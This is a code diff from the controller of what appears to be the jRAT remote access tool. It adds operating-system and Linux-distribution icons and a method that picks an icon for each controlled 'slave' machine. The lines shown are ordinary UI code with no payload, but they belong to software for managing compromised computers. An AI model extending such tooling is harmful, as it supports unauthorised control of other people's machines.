@@ -11,9 +11,22 @@ import javax.swing.filechooser.FileSystemView;
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Main;
 import se.jrat.client.ui.frames.Frame;
+import se.jrat.common.OperatingSystem;
 
 
 public class IconUtils {
+	
+	public static final ImageIcon OS_WIN = IconUtils.getIcon("os");
+	public static final ImageIcon OS_WIN8 = IconUtils.getIcon("os_win8");
+	public static final ImageIcon OS_MAC = IconUtils.getIcon("os_mac");
+	public static final ImageIcon OS_LINUX = IconUtils.getIcon("os_linux");
+	public static final ImageIcon OS_ANDROID = IconUtils.getIcon("NONE"); //TODO
+	public static final ImageIcon OS_OTHERS = IconUtils.getIcon("last_modified");
+	
+	public static final ImageIcon DIST_UBUNTU = IconUtils.getIcon("dist_ubuntu");
+	public static final ImageIcon DIST_KALI = IconUtils.getIcon("dist_kali");
+	public static final ImageIcon DIST_CENTOS = IconUtils.getIcon("dist_centos");
+	public static final ImageIcon DIST_DEBIAN = IconUtils.getIcon("dist_debian");
 
 	public static ImageIcon getIcon(String name, boolean defaultfolder) {
 		URL url;
@@ -78,6 +91,38 @@ public class IconUtils {
 			Utils.pingicons.put(str, icon);
 		}
 
+		return icon;
+	}
+	
+	public static ImageIcon getOSIcon(AbstractSlave slave) {
+		ImageIcon icon;
+		
+		if (slave.getOS() == OperatingSystem.WINDOWS) {
+			if (slave.getOperatingSystem().startsWith("Windows 8")) {
+				icon = OS_WIN8;
+			} else {
+				icon = OS_WIN;
+			}
+		} else if (slave.getOS() == OperatingSystem.OSX) {
+			icon = OS_MAC;
+		} else if (slave.getOS() == OperatingSystem.LINUX) {
+			if (slave.getOperatingSystem().toLowerCase().contains("ubuntu")) {
+				icon = DIST_UBUNTU;
+			} else if (slave.getOperatingSystem().toLowerCase().contains("kali") || slave.getOperatingSystem().toLowerCase().contains("backtrack")) {
+				icon = DIST_KALI;
+			} else if (slave.getOperatingSystem().toLowerCase().contains("centos")) {
+				icon = DIST_CENTOS;
+			} else if (slave.getOperatingSystem().toLowerCase().contains("debian")) {
+				icon = DIST_DEBIAN;
+			} else {
+				icon = OS_LINUX;
+			}
+		} else if (slave.getOS() == OperatingSystem.ANDROID) {
+			icon = OS_ANDROID;
+		} else {
+			icon = OS_OTHERS;
+		}
+		
 		return icon;
 	}
 
